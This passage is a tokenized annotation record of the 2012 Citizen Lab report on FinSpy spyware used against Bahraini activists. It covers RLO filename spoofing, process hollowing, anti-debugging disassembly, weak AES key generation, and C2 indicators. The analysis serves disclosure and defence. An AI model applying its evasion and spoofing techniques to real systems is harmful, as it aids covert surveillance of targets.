"pos": [1, 2]}, {"old_id": "T42", "type": "Software", "name": "OllyDbg", "sent_id": 119, "pos": [15]}, {"old_id": "T43", "type": "Software", "name": "DbgBreakPoint", "sent_id": 128, "pos": [2]}, {"old_id": "T44", "type": "Indicator", "name": "C:\\Windows\\Installer\\{49FD463C-18F1-63C4-8F12-49F518F127}", "sent_id": 153, "pos": []}, {"old_id": "T45", "type": "File", "name": "t111o00000000dat", "sent_id": 162, "pos": []}, {"old_id": "T46", "type": "Time", "name": "Thu Jun 14 2012 12:31:34", "sent_id": 164, "pos": [0, 4]}, {"old_id": "T47", "type": "Time", "name": "Thu Jun 14 2012 12:32:18", "sent_id": 165, "pos": [0, 4]}, {"old_id": "T48", "type": "Time", "name": "Thu Jun 14 2012 12:55:12", "sent_id": 166, "pos": [0, 4]}, {"old_id": "T49", "type": "Indicator", "name": "XXY1TTTTTTTTdat", "sent_id": 174, "pos": []}, {"old_id": "T50", "type": "Obfuscation", "name": "AES-256-CBC", "sent_id": 179, "pos": [8]}, {"old_id": "T51", "type": "File", "name": "%USERPROFILE%\\Local Settings\\Temp\\smtXXtmp", "sent_id": 237, "pos": []}, {"old_id": "T52", "type": "File", "name": "smtXXtmp", "sent_id": 238, "pos": []}, {"old_id": "T53", "type": "File", "name": "1431028D41FDdat", "sent_id": 240, "pos": []}, {"old_id": "T54", "type": "Address", "name": "7769140194", "sent_id": 259, "pos": []}, {"old_id": "T55", "type": "Organization", "name": "Batelco", "sent_id": 262, "pos": [9]}, {"old_id": "T56", "type": "Organization", "name": "WHOIS", "sent_id": 262, "pos": [0]}, {"old_id": "T57", "type": "Address", "name": "7769140194", "sent_id": 281, "pos": []}, {"old_id": "T58", "type": "Address", "name": "19216813165", "sent_id": 281, "pos": []}, {"old_id": "T59", "type": "Address", "name": "19216813165", "sent_id": 282, "pos": []}, {"old_id": "T60", "type": "Address", "name": "7769149194", "sent_id": 282, "pos": []}, {"old_id": "T61", "type": "Malware", "name": "finspyv401", "sent_id": 288, "pos": []}, {"old_id": "T62", "type": "Malware", "name": "finspyv2", "sent_id": 289, "pos": []}, {"old_id": "T63", "type": "MD5", "name": "c488a8aaef0df577efdf1b501611ec20", "sent_id": 331, "pos": [1]}, {"old_id": "T64", "type": "SHA-1", "name": "5ea6ae50063da8354e8500d02d0621f643827346", "sent_id": 332, "pos": [1]}, {"old_id": "T65", "type": "SHA-256", "name": "81531ce5a248aead7cda76dd300f303dafe6f1b7a4c953ca4d7a9a27b5cd6cdf", "sent_id": 333, "pos": [1]}, {"old_id": "T66", "type": "Indicator", "name": "tigergamma-internationalde", "sent_id": 335, "pos": []}, {"old_id": "T67", "type": "Indicator", "name": "ff-demoblogdnsorg", "sent_id": 336, "pos": []}, {"old_id": "T68", "type": "Person", "name": "Martin Muench", "sent_id": 339, "pos": [1, 2]}, {"old_id": "T69", "type": "Organization", "name": "Gamma International GmbH", "sent_id": 340, "pos": [1, 3]}, {"old_id": "T70", "type": "Location", "name": "Munich", "sent_id": 343, "pos": [1]}, {"old_id": "T71", "type": "Email", "name": "info@gamma-internationalde", "sent_id": 347, "pos": []}, {"old_id": "T72", "type": "Time", "name": "2011-04-04T11:24:20+02:00", "sent_id": 348, "pos": [1]}, {"old_id": "T73", "type": "Indicator", "name": "ff-demoblogdnsorg", "sent_id": 354, "pos": []}], "labels": [{"old_id": "R1", "r": "P17", "h": 1, "t": 2, "evidence": [7]}, {"old_id": "R2", "r": "P21", "h": 38, "t": 39, "evidence": [101, 102, 103, 104, 105]}], "title": ["inputs/txt/201207CitizenLabFinFisher"], "sents": [["Research", "Brief"], ["July", "2012"], ["The", "Citizen", "Lab"], ["From", "Bahrain", "with", "Love:"], ["FinFisher\u2019s", "Spy", "Kit", "Exposed", "?"], ["Author:", "Morgan", "Marquis-Boire"], ["INTRODUCTION"], ["The", "FinFisher", "Suite", "is", "described", "by", "its", "distributors", ",", "Gamma", "International", "UK", "Ltd", ".", ",", "as", "\"Governmental", "IT"], ["Intrusion", "and", "Remote", "Monitoring", "Solutions", ".", "\"", "1", "The", "toolset", "first", "gained", "notoriety", "after", "it", "was", "revealed", "that", "the"], ["Egyptian", "Government\u2019s", "state", "security", "apparatus", "had", "been", "involved", "in", "negotiations", "with", "Gamma", "International"], ["UK", "Ltd", ".", "over", "the", "purchase", "of", "the", "software", ".", "Promotional", "materials", "have", "been", "leaked", "that", "describe", "the", "tools", "as"], ["providing", "a", "wide", "range", "of", "intrusion", "and", "monitoring", "capabilities", ".", "2", "Despite", "this", ",", "however", ",", "the", "toolset", "itself", "has"], ["not", "been", "publicly", "analyzed", "."], ["This", "post", "contains", "analysis", "of", "several", "pieces", "of", "malware", "obtained", "by", "Vernon", "Silver", "of", "Bloomberg", "News", "that"], ["were", "sent", "to", "Bahraini", "pro-democracy", "activists", "in", "April", "and", "May", "of", "this", "year", ".", "The", "purpose", "of", "this", "work", "is"], ["identification", "and", "classification", "of", "the", "malware", "to", "better", "understand", "the", "actors", "behind", "the", "attacks", "and", "the", "risk"], ["to", "victims", ".", "In", "order", "to", "accomplish", "this", ",", "we", "undertook", "several", "different", "approaches", "during", "the", "investigation", "."], ["As", "well", "as", "directly", "examining", "the", "samples", "through", "static", "and", "dynamic", "analysis", ",", "we", "infected", "a", "virtual", "machine"], ["(VM)", "with", "the", "malware", ".", "We", "monitored", "the", "filesystem", ",", "network", ",", "and", "running", "operating", "system", "of", "the", "infected"], ["VM", "."], ["This", "analysis", "suggests", "the", "use", "of", "\u201cFinspy\u201d", ",", "part", "of", "the", "commercial", "intrusion", "kit", ",", "Finfisher", ",", "distributed", "by"], ["Gamma", "International", "."], ["July", "2012"], ["DELIVERY"], ["This", "section", "describes", "how", "the", "malware", "was", "delivered", "to", "potential", "victims", "using", "e-mails", "with", "malicious"], ["attachments", "."], ["In", "early", "May", ",", "we", "were", "alerted", "that", "Bahraini", "activists", "were", "targeted", "with", "apparently", "malicious", "e-mails", ".", "The"], ["emails", "ostensibly", "pertained", "to", "the", "ongoing", "turmoil", "in", "Bahrain", ",", "and", "encouraged", "recipients", "to", "open", "a", "series", "of"], ["suspicious", "attachments", ".", "The", "screenshot", "below", "is", "indicative", "of", "typical", "message", "content:"], ["The", "attachments", "to", "the", "e-mails", "we", "have", "been", "able", "to", "analyze", "were", "typically", "", ".", "rar", "files", ",", "which", "we", "found", "to"], ["contain", "malware", ".", "Note", "that", "the", "apparent", "sender", "has", "an", "e-mail", "address", "that", "indicates", "that", "it", "was", "being", "sent", "by"], ["\u201cMelissa", "Chan", ",", "\u201d", "who", "is", "a", "real", "correspondent", "for", "Aljazeera", "English", ".", "We", "suspect", "that", "the", "e-mail", "address", "is", "not"], ["her", "real", "address", ".", "3", "The", "following", "samples", "were", "examined:"], ["324783fbc33ec117f971cca77ef7ceaf7ce229a74edd6e2b3bd0effd9ed10dcc", "rar", ".", "\u202b\u0627\u0644\u0641\u0639\u0627\u0644\u064a\u0627\u062a\u202c"], ["c5b39d98c85b21f8ac1bedd91f0b6510ea255411cf19c726545c1d0a23035914", "_gpj", ".", "ArrestedXSuspects.rar"], ["c5b37bb3620d4e7635c261e5810d628fc50e4ab06b843d78105a12cfbbea40d7"], ["KingXhamadXonXofficialXvisitXtoX", ".", "rar"], ["80fb86e265d44fbabac942f7b26c973944d2ace8a8268c094c3527b83169b3cc", "MeetingXAgenda", ".", "rar"], ["f846301e7f190ee3bb2d3821971cc2456617edc2060b07729415c45633a5a751", "Rajab", ".", "rar"], ["These", "contained", "executables", "masquerading", "as", "picture", "files", "or", "documents:"], ["49000fc53412bfda157417e2335410cf69ac26b66b0818a3be7eff589669d040", "dialoge", ".", "exe"], ["cc3b65a0f559fa5e6bf4e60eef3bffe8d568a93dbb850f78bdd3560f38218b5c", "exe", ".", "Rajab1.jpg"], ["39b325bd19e0fe6e3e0fca355c2afddfe19cdd14ebda7a5fc96491fc66e0faba", "exe", ".", "image1.jpg"], ["e48bfeab2aca1741e6da62f8b8fc9e39078db574881691a464effe797222e632", "exe", ".", "Rajab.jpg"], ["2ec6814e4bad0cb03db6e241aabdc5e59661fb580bd870bdb50a39f1748b1d14", "exe", ".", "Arrested", "Suspects", ".", "jpg"], ["c29052dc6ee8257ec6c74618b6175abd6eb4400412c99ff34763ff6e20bab864", "News", "about", "the", "existence", "of", "a"], ["new", "dialogue", "between", "AlWefaq", "&", "Govt", ".", ".doc"], ["2"], ["July", "2012"], ["The", "emails", "generally", "suggested", "that", "the", "attachments", "contained", "political", "content", "of", "interest", "to", "pro-democracy"], ["activists", "and", "dissidents", ".", "In", "order", "to", "disguise", "the", "nature", "of", "the", "attachments", "a", "malicious", "usage", "of"], ["the", "\u201crighttoleftoverride\"", "(RLO)", "character", "was", "employed", ".", "The", "RLO", "character", "(U+202e", "in", "unicode)", "controls", "the"], ["positioning", "of", "characters", "in", "text", "containing", "characters", "flowing", "from", "right", "to", "left", ",", "such", "as", "Arabic", "or", "Hebrew", "."], ["The", "malware", "appears", "on", "a", "victim\u2019s", "desktop", "as", "\"exe", ".", "Rajab1.jpg\"", "(for", "example)", ",", "along", "with", "the", "default"], ["Windows", "icon", "for", "a", "picture", "file", "without", "thumbnail", ".", "But", ",", "when", "the", "UTF-8", "based", "filename", "is", "displayed", "in"], ["ANSI", ",", "the", "name", "is", "displayed", "as", "\"gpj", ".", "1bajaR.exe\u201d.", "Believing", "that", "they", "are", "opening", "a", "harmless", "\u201c", ".", "jpg\u201d,", "victims"], ["are", "instead", "tricked", "into", "running", "an", "executable", "\"", ".", "exe\"", "file", ".", "4"], ["Upon", "execution", "these", "files", "install", "a", "multi-featured", "trojan", "on", "the", "victim\u2019s", "computer", ".", "This", "malware", "provides", "the"], ["attacker", "with", "clandestine", "remote", "access", "to", "the", "victim\u2019s", "machine", "as", "well", "as", "comprehensive", "data", "harvesting", "and"], ["exfiltration", "capabilities", "."], ["INSTALLATION"], ["This", "section", "describes", "how", "the", "malware", "infects", "the", "target", "machine", "."], ["The", "malware", "displays", "a", "picture", "as", "expected", ".", "This", "differs", "from", "sample", "to", "sample", ".", "The", "sample", "\u201cArrested"], ["Suspects", ".", "jpg\u201d", "(\u201cgpj", ".", "stcepsuS", "detserrA", ".", "exe\u201d)", "displays:"], ["3"], ["July", "2012"], ["It", "additionally", "creates", "a", "directory", "(which", "appears", "to", "vary", "from", "sample", "to", "sample):"], ["C:\\Documents", "and", "Settings\\XPMUser\\Local", "Settings\\Temp\\TMP51B7AFEF"], ["It", "copies", "itself", "there", "(in", "this", "case", "the", "malware", "appears", "as", "\u201cArrested", "Suspects", ".", "jpg\u201d)", "where", "it", "is", "renamed:"], ["C:\\Documents", "and", "Settings\\XPMUser\\Local", "Settings\\Temp\\TMP51B7AFEF\\Arrested", "Suspects", ".", "jpg\u201d", "=>"], ["C:\\Documents", "and", "Settings\\XPMUser\\Local", "Settings\\Temp\\TMP51B7AFEF\\tmpD", ".", "tmp"], ["Then", "it", "drops", "the", "following", "files:"], ["C:\\DOCUME~1\\%USER%\\LOCALS~1\\Temp\\delete", ".", "bat"], ["C:\\DOCUME~1\\%USER%\\LOCALS~1\\Temp\\driverw", ".", "sys"], ["It", "creates", "the", "folder", "(the", "name", "of", "which", "varies", "from", "host", "to", "host):"], ["C:\\Documents", "and", "Settings\\%USER%\\Application", "Data\\Microsoft\\Installer\\{5DA45CC9-D840-47CC9F86-FD2E9A718A41}"], ["This", "process", "is", "observable", "on", "the", "filesystem", "timeline", "of", "the", "infected", "host", "(click", "image", "to", "enlarge):"], ["\u201cdriverw", ".", "sys\u201d", "is", "loaded", "and", "then", "\u201cdelete", ".", "bat\u201d", "is", "run", "which", "deletes", "the", "original", "payload", "and", "itself", ".", "It", "then"], ["infects", "existing", "operating", "system", "processes", ",", "connects", "to", "the", "command", "and", "control", "server", ",", "and", "begins", "data"], ["harvesting", "and", "exfiltration", "."], ["4"], ["July", "2012"], ["Examining", "the", "memory", "image", "of", "a", "machine", "infected", "with", "the", "malware", "shows", "that", "a", "technique", "for", "infecting"], ["processes", "known", "as", "\u201cprocess", "hollowing\"", "is", "used", ".", "For", "example", ",", "the", "memory", "segment", "below", "from", "the"], ["\u201cwinlogon", ".", "exe\u201d", "process", "is", "marked", "as", "executable", "and", "writeable:"], ["Here", "the", "malware", "starts", "a", "new", "instance", "of", "a", "legitimate", "process", "such", "as", "\u201cwinlogon", ".", "exe\u201d", "and", "before", "the"], ["process\u2019s", "first", "thread", "begins", ",", "the", "malware", "de-allocates", "the", "memory", "containing", "the", "legitimate", "code", "and", "injects"], ["malicious", "code", "in", "its", "place", ".", "Dumping", "and", "examining", "this", "memory", "segment", "reveals", "the", "following", "strings", "in", "the"], ["infected", "process:"], ["Note", "the", "string:"], ["y:\\lsvn_branches\\finspyv4", ".", "01\\finspyv2\\src\\libs\\libgmp\\mpn-tdiv_qr.c"], ["5"], ["July", "2012"], ["This", "file", "seems", "to", "correspond", "to", "a", "file", "in", "the", "GNU", "Multi-Precision", "arithmetic", "library:"], ["http://gmplib", ".", "org:8000/gmp/file/b5ca16212198/mpn/generic/tdiv_qr.c"], ["The", "process", "\u201csvchost", ".", "exe\u201d", "was", "also", "found", "to", "be", "infected", "in", "a", "similar", "manner:"], ["6"], ["July", "2012"], ["Further", "examination", "of", "the", "memory", "dump", "also", "reveals", "the", "following:"], ["This", "path", "appears", "to", "reference", "the", "functionality", "that", "the", "malware", "uses", "to", "modify", "the", "boot", "sequence", "to", "enable"], ["persistence:"], ["y:\\lsvn_branches\\finspyv4", ".", "01\\finspyv2\\src\\target\\bootkit_x32driver\\objfre_w2k_x86\\i386\\bootkit_x32driv"], ["er", ".", "pdb"], ["A", "pre-infection", "vs", "post-infection", "comparison", "of", "the", "infected", "VM", "shows", "that", "the", "Master", "Boot", "Record", "(MBR)"], ["was", "modified", "by", "code", "injected", "by", "the", "malware", "."], ["The", "strings", "found", "in", "memory", "\u201cfinspyv4", ".", "01\u201d", "and", "\u201cfinspyv2\u201d", "are", "particularly", "interesting", ".", "The", "FinSpy", "tool", "is"], ["part", "of", "the", "FinFisher", "intrusion", "and", "monitoring", "toolkit", ".", "5"], ["OBFUSCATION", "AND", "EVASION"], ["This", "section", "describes", "how", "the", "malware", "is", "designed", "to", "resist", "analysis", "and", "evade", "identification", "."], ["The", "malware", "employs", "a", "myriad", "of", "techniques", "designed", "to", "evade", "detection", "and", "frustrate", "analysis", ".", "While"], ["investigation", "into", "this", "area", "is", "far", "from", "complete", ",", "we", "discuss", "several", "discovered", "methods", "as", "examples", "of", "the"], ["lengths", "taken", "by", "the", "developers", "to", "avoid", "identification", "."], ["A", "virtualised", "packer", "is", "used", ".", "This", "type", "of", "obfuscation", "is", "used", "by", "those", "that", "have", "\u201cstrong", "motives", "to", "prevent"], ["their", "malware", "from", "being", "analyzed\u201d", ".", "6"], ["This", "converts", "the", "native", "x86", "instructions", "of", "the", "malware", "into", "another", "custom", "language", "chosen", "from", "one", "of", "11"], ["code", "templates", ".", "At", "run-time", ",", "this", "is", "interpreted", "by", "an", "obfuscated", "interpreter", "customized", "for", "that", "particular"], ["language", ".", "This", "virtualised", "packer", "was", "not", "recognised", "and", "appears", "to", "be", "bespoke", "."], ["7"], ["July", "2012"], ["Several", "anti-debugging", "techniques", "are", "used", ".", "This", "section", "of", "code", "crashes", "the", "popular", "debugger", ",", "OllyDbg", "."], ["", ".", "text:00401683", "finit"], ["", ".", "text:00401686", "fld", "ds:tbyte_40168E"], ["", ".", "text:0040168C", "jmp", "short", "locret_401698"], ["--------------------------------------------------------------------", ".", "text:0040168E", "tbyte_40168E", "dt", "9", ".", "2233720368547758075e18"], ["--------------------------------------------------------------------", ".", "text:00401698", "locret_401698:"], ["", ".", "text:00401698", "retn"], ["This", "float", "value", "causes", "OllyDbg", "to", "crash", "when", "trying", "to", "display", "its", "value", ".", "A", "more", "detailed", "explanation", "of", "this"], ["can", "be", "found", "here", "."], ["To", "defeat", "DbgBreakPoint", "based", "debuggers", ",", "the", "malware", "finds", "the", "address", "of", "DbgBreakPoint", ",", "makes", "the", "page"], ["EXECUTE_READWRITE", "and", "writes", "a", "NOP", "on", "the", "entry", "point", "of", "DbgBreakPoint", "."], ["The", "malware", "checks", "via", "PEB", "to", "detect", "whether", "or", "not", "it", "is", "being", "debugged", ",", "and", "if", "it", "is", "it", "returns", "a", "random"], ["address", "."], ["The", "malware", "calls", "ZwSetInformationThread", "with", "ThreadInformationClass", "set", "to", "0x11", ",", "which", "causes", "the"], ["thread", "to", "be", "detached", "from", "the", "debugger", "."], ["The", "malware", "calls", "ZwQueryInformationProcess", "with", "ThreadInformationClass", "set", "to", "0x(ProcessDebugPort)"], ["and", "0x1e", "(ProcessDebugObjectHandle)", "to", "detect", "the", "presence", "of", "a", "debugger", ".", "If", "a", "debugger", "is", "detected", "it", "jumps"], ["to", "a", "random", "address", ".", "ZwQueryInformationProcess", "is", "also", "called", "to", "check", "the", "DEP", "status", "on", "the", "current"], ["process", ",", "and", "it", "disables", "it", "if", "it\u2019s", "found", "to", "be", "enabled", "."], ["The", "malware", "deploys", "a", "granular", "solution", "for", "Antivirus", "software", ",", "tailored", "to", "the", "AV", "present", "on", "the", "infected"], ["machine", ".", "The", "malware", "calls", "ZwQuerySystemInformation", "to", "get", "ProcessInformation", "and", "ModuleInformation", "."], ["The", "malware", "then", "walks", "the", "list", "of", "processes", "and", "modules", "looking", "for", "installed", "AV", "software", ".", "Our", "analysis"], ["indicates", "that", "the", "malware", "appears", "to", "have", "different", "code", "to", "Open/Create", "process", "and", "inject", "for", "each", "AV"], ["solution", ".", "For", "some", "Anti-Virus", "software", "this", "even", "appears", "to", "be", "version", "dependent", ".", "The", "function"], ["\u201cZwQuerySystemInformation\u201d", "is", "also", "hooked", "by", "the", "malware", ",", "a", "technique", "frequently", "used", "to", "allow", "process"], ["hiding:"], ["8"], ["July", "2012"], ["DATA", "HARVESTING", "AND", "ENCRYPTION"], ["This", "section", "describes", "how", "the", "malware", "collects", "and", "encrypts", "data", "from", "the", "infected", "machine", "."], ["9"], ["July", "2012"], ["Our", "analysis", "showed", "that", "the", "malware", "collects", "a", "wide", "range", "of", "data", "from", "an", "infected", "victim", ".", "The", "data", "is"], ["stored", "locally", "in", "a", "hidden", "directory", ",", "and", "is", "disguised", "with", "encryption", "prior", "to", "exfiltration", "."], ["\"C:\\Windows\\Installer\\{49FD463C-18F1-63C4-8F12-49F518F127}", ".", "\""], ["On", "the", "reference", "victim", "host", ",", "the", "directory", "was:"], ["We", "conducted", "forensic", "examination", "of", "the", "files", "created", "in", "this", "directory", "and", "identified", "a", "wide", "range", "of", "data"], ["collected", ".", "Files", "in", "this", "directory", "were", "found", "to", "be", "screenshots", ",", "keylogger", "data", ",", "audio", "from", "Skype", "calls", ","], ["passwords", "and", "more", ".", "For", "the", "sake", "of", "brevity", "we", "include", "a", "limited", "set", "of", "examples", "here", "."], ["The", "malware", "attempts", "to", "locate", "the", "configuration", "and", "password", "store", "files", "for", "a", "variety", "browsers", "and", "chat"], ["clients", "as", "seen", "below:"], ["10"], ["July", "2012"], ["We", "observed", "the", "creation", "of", "the", "file", "\u201ct111o00000000", ".", "dat\u201d", "in", "the", "data", "harvesting", "directory", ",", "as", "shown", "in", "the"], ["filesystem", "timeline", "below:"], ["Thu", "Jun", "14", "2012", "12:31:34", "52719", "mac", ".", "r/rr-xr-xr-x", "0", "0", "26395-128-5", "C:/WINDOWS/Installer/{49FD463C18F1-63C4-8F12-49F518F127}/09e493e2-05f9-4899-b661-c52f3554c644"], ["Thu", "Jun", "14", "2012", "12:32:18", "285691", "", ".", "..b", "r/rrwxrwxrwx", "0", "0", "26397-128-4", "C:/WINDOWS/Installer/{49FD463C18F1-63C4-8F12-49F518F127}/t111o00000000", ".", "dat"], ["Thu", "Jun", "14", "2012", "12:55:12", "285691", "mac", ".", "r/rrwxrwxrwx", "0", "0", "26397-128-4"], ["C:/WINDOWS/Installer/{49FD463C-18F1-63C4-8F12-49F518F127}/t111o00000000", ".", "dat"], ["4096", "", ".", ".c.", "-/rr-xr-xr-x", "0", "0", "26447-128-4"], ["The", "infected", "process", "\u201cwinlogon", ".", "exe\u201d", "was", "observed", "writing", "this", "file", "via", "Process:"], ["11"], ["July", "2012"], ["Examination", "of", "this", "file", "reveals", "that", "it", "is", "a", "screenshot", "of", "the", "desktop:"], ["Many", "other", "modules", "providing", "specific", "exfiltration", "capabilities", "were", "observed", ".", "Generally", ",", "the", "exfiltration"], ["modules", "write", "files", "to", "disk", "using", "the", "following", "naming", "convention:", "XXY1TTTTTTTT", ".", "dat.", "XX", "is", "a", "two-digit"], ["hexadecimal", "module", "number", ",", "Y", "is", "a", "single-digit", "hexadecimal", "submodule", "number", ",", "and", "TTTTTTTT", "is", "a"], ["hexadecimal", "representation", "of", "a", "unix", "timestamp", "(less", "1", ".", "3", "billion)", "associated", "with", "the", "file", "creation", "time", "."], ["ENCRYPTION"], ["The", "malware", "uses", "encryption", "in", "an", "attempt", "to", "disguise", "harvested", "data", "in", "the", "", ".", "dat", "files", "intended", "for", "exfiltration", "."], ["Data", "written", "to", "the", "files", "is", "encrypted", "using", "AES-256-CBC", "(with", "no", "padding)", ".", "The", "32-byte", "key", "consists", "of", "8"], ["readings", "from", "memory", "address", "0x7ffe0014:", "a", "special", "address", "in", "Windows", "that", "contains", "the", "low-order-4-bytes"], ["of", "the", "number", "of", "hundred-nanoseconds", "since", "1", "January", "1601", ".", "The", "IV", "consists", "of", "4", "additional", "readings", "."], ["The", "AES", "key", "structure", "is", "highly", "predictable", ",", "as", "the", "quantum", "for", "updating", "the", "system"], ["clock", "(HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\Config\\LastClockRate)", "is", "set", "to"], ["12"], ["July", "2012"], ["0x2625A", "hundred-nanoseconds", "by", "default", ",", "and", "the", "clock", "readings", "that", "comprise", "the", "key", "and", "IV", "are", "taken", "in", "a"], ["tight", "loop:"], ["", ".", ".."], ["0x406EA4:", "8D45C0", "LEA", "EAX", ",", "[EBP-0x40]"], ["0x406EA7:", "50", "PUSH", "EAX"], ["0x406EA8:", "FF150C10AF01", "CALL", "DWORD", "PTR", "[0x1AF100C]"], ["0x406EAE:", "8B4DE8", "MOV", "ECX", ",", "DWORD", "PTR", "[EBP-0x18]"], ["0x406EB1:", "8B45C0", "MOV", "EAX", ",", "DWORD", "PTR", "[EBP-0x40]"], ["0x406EB4:", "8345E804", "ADD", "DWORD", "PTR", "[EBP-0x18]", ",", "0x4"], ["0x406EB8:", "6A01", "PUSH", "0x1"], ["0x406EBA:", "89040F", "MOV", "DWORD", "PTR", "[EDI+ECX]", ",", "EAX"], ["0x406EBD:", "FF152810AF01", "CALL", "DWORD", "PTR", "[0x1AF1028]"], ["0x406EC3:", "817DE800010000", "CMP", "DWORD", "PTR", "[EBP-0x18]", ",", "0x100"], ["0x406ECA:", "72D8", "JB", "0x406EA4"], ["0x406ECC:", "80277F", "AND", "BYTE", "PTR", "[EDI]", ",", "0x7F"], ["", ".", ".."], ["The", "following", "AES", "keys", "were", "among", "those", "found", "to", "be", "used", "to", "encrypt", "records", "in", "", ".", "dat", "files", ".", "The", "first", "contains"], ["the", "same", "4", "bytes", "repeated", ",", "whereas", "in", "the", "second", "key", ",", "the", "difference", "between", "all", "consecutive", "4-byte", "blocks"], ["(with", "byte", "order", "swapped)", "is", "0x2625A", "."], ["70", "31", "bd", "cc", "70", "31", "bd", "cc", "70", "31", "bd", "cc", "70", "31", "bd", "cc", "70", "31", "bd", "cc", "70", "31", "bd", "cc", "70", "31"], ["bd", "cc", "70", "31", "bd", "cc"], ["26", "e9", "23", "60", "80", "4b", "26", "60", "da", "ad", "28", "60", "34", "10", "2b", "60", "8e", "72", "2d", "60", "e8", "d4", "2f", "60", "42", "37"], ["32", "60", "9c", "99", "34", "60"], ["In", "all", ",", "64", "clock", "readings", "are", "taken", ".", "The", "readings", "are", "encrypted", "using", "an", "RSA", "public", "key", "found", "in", "memory"], ["(whose", "modulus", "begins", "with", "A25A944E)", "and", "written", "to", "the", "", ".", "dat", "file", "before", "any", "other", "encrypted", "data", ".", "No"], ["padding", "is", "used", "in", "the", "encryption", ",", "yielding", "exactly", "256", "encrypted", "bytes", ".", "After", "the", "encrypted", "timestamp"], ["values", ",", "the", "file", "contains", "a", "number", "of", "records", "encrypted", "with", "AES", ",", "delimited", "by", "EAE9E8FF", "."], ["13"], ["July", "2012"], ["In", "reality", ",", "these", "records", "are", "only", "partially", "encrypted:", "if", "the", "record\u2019s", "length", "is", "not", "a", "multiple", "of", "16", "bytes", "(the"], ["AES", "block", "size)", ",", "then", "the", "remainder", "of", "the", "bytes", "are", "written", "to", "the", "file", "unencrypted", ".", "For", "example", ",", "after", "typing"], ["\u201cFinSpy\u201d", "on", "the", "keyboard", ",", "the", "keylogger", "module", "produced", "the", "following", "(trailing", "plaintext", "highlighted):"], ["The", "predictability", "of", "the", "AES", "encryption", "keys", "allowed", "us", "to", "decrypt", "and", "view", "these", "partially-encrypted"], ["records", "in", "full", "plaintext", ".", "The", "nature", "of", "the", "records", "depends", "on", "the", "particular", "module", "and", "submodule", ".", "For"], ["example", ",", "submodule", "Y", "==", "5", "of", "the", "Skype", "exfiltration", "module", "(XX", "==", "14)", ",", "contains", "a", "csv", "representation", "of", "the"], ["user\u2019s", "contact", "list:"], ["Record", "#", "0", "Length:", "243", "bytes:"], ["\u00f3"], ["@\u00fe\u00ff\u00cc\u00b3\u00d0"], ["@"], ["\u00a4b\u00afOp\u00fe192", ".", "168.131.67JRecordingEcsv", "0\u00fe-0800UTC", "DST", ".", "1\u00fe2012-07-18", "18:00:21", ".", ":\u00fe1970-01-01"], ["00:16:00Abhwatch1"], ["Record", "#", "1", "Length:", "96", "bytes:"], ["`USERNAME", ",", "FULLNAME,COUNTRY,AUTHORIZED,BLOCKED"], ["Record", "#", "2", "Length:", "90", "bytes:"], ["Zecho123", ",", "Echo", "/", "Sound", "Test", "Service", ",", ",YES,NO"], ["Record", "#", "3", "Length:", "95", "bytes:"], ["^bhwatch2", ",", "Bahrain", "Watch", ",", "United", "States", ",", "YES,NO"], ["14"], ["July", "2012"], ["Submodule", "Y", "==", "3", "records", "file", "transfers", ".", "After", "a", "Skype", "file", "transfer", "concludes", ",", "the", "following", "file", "is", "created:"], ["%USERPROFILE%\\Local", "Settings\\Temp\\smtXX", ".", "tmp.", "This", "file", "appears", "to", "contain", "the", "sent", "/", "received"], ["file", ".", "As", "soon", "as", "smtXX", ".", "tmp", "is", "finished", "being", "written", "to", "disk", ",", "a", "file", "(1431XXXXXXXX", ".", "dat)", "is", "written", ","], ["roughly", "the", "same", "size", "as", "smtXX", ".", "tmp.", "After", "sending", "a", "picture", "(of", "birdshot", "shotgun", "shell", "casings", "used", "by"], ["Bahrain\u2019s", "police)", "to", "an", "infected", "Skype", "client", ",", "the", "file", "1431028D41FD", ".", "dat", "was", "observed", "being", "written", "to"], ["disk", ".", "Decrypting", "it", "revealed", "the", "following:"], ["Record", "#", "0", "Length:", "441", "bytes:"], ["\u00b9"], ["@\u00fe\u00ff\u00cc\u00b3\u00d0"], ["@"], ["\u00a4b\u00afOp\u00fe192", ".", "168.131.67Abhwatch1Bbhwatch2\"CBahrain", "WatchIreceivedrC:\\Documents", "and"], ["Settings\\XPMUser\\My", "Documents\\gameborev3", ".", "jpgJRecording", "0\u00fe-0800UTC", "DST", ".", "1\u00fe2012-07-20"], ["12:18:21", ".", ":\u00fe2012-07-20", "12:18:21"], ["Record", "#", "1", "Length:", "78247", "bytes:"], ["[Note:", "Record", "#1", "contained", "the", "contents", "of", "the", "", ".", "jpg", "file", ",", "preceded", "by", "hex", "A731010090051400", ",", "and"], ["followed", "by", "hex", "0A0A0A0A", ".", "]"], ["15"], ["July", "2012"], ["Additionally", ",", "submodule", "Y", "==", "1", "records", "Skype", "chat", "messages", ",", "and", "submodule", "Y", "==", "2", "records", "audio", "from", "all"], ["participants", "in", "a", "Skype", "call", ".", "The", "call", "recording", "functionality", "appears", "to", "be", "provided", "by", "hooking"], ["DirectSoundCaptureCreate:"], ["COMMAND", "AND", "CONTROL"], ["This", "section", "describes", "the", "communications", "behavior", "of", "the", "malware", "."], ["When", "we", "examined", "the", "malware", "samples", "we", "found", "that", "they", "connect", "to", "a", "server", "at", "IP", "address", "77", ".", "69.140.194"], ["16"], ["July", "2012"], ["WHOIS", "data7", "reveals", "that", "this", "address", "is", "owned", "by", "Batelco", ",", "the", "principal", "telecommunications", "company", "of"], ["Bahrain:"], ["inetnum:", "77", ".", "69.128.0", "-", "77", ".", "69.159.255"], ["netname:", "ADSL"], ["descr:", "Batelco", "ADSL", "service"], ["country:", "bh"], ["For", "a", "period", "of", "close", "to", "10", "minutes", ",", "traffic", "was", "observed", "between", "the", "infected", "victim", "and", "the", "command", "and"], ["control", "host", "in", "Bahrain", "."], ["A", "summary", "of", "the", "traffic", "by", "port", "and", "conversation", "size", "(click", "image", "to", "enlarge):"], ["The", "infected", "VM", "talks", "to", "the", "remote", "host", "on", "the", "following", "five", "TCP", "ports:"], ["22"], ["53"], ["80"], ["443"], ["4111"], ["Based", "on", "observation", "of", "an", "infected", "machine", "we", "were", "able", "to", "determine", "that", "the", "majority", "of", "data", "is", "exfiltrated"], ["to", "the", "remote", "host", "via", "ports", "443", "and", "4111", "."], ["17"], ["July", "2012"], ["192", ".", "168.131.65:1213", "->", "77", ".", "69.140.194:443", "1270075", "bytes"], ["192", ".", "168.131.65:4111", "->", "77", ".", "69.149.194:4111", "4766223", "bytes"], ["CONCLUSIONS", "ABOUT", "MALWARE", "IDENTIFICATION"], ["Our", "analysis", "yields", "indicators", "about", "the", "identity", "of", "the", "malware", "we", "have", "analyzed:", "(1)", 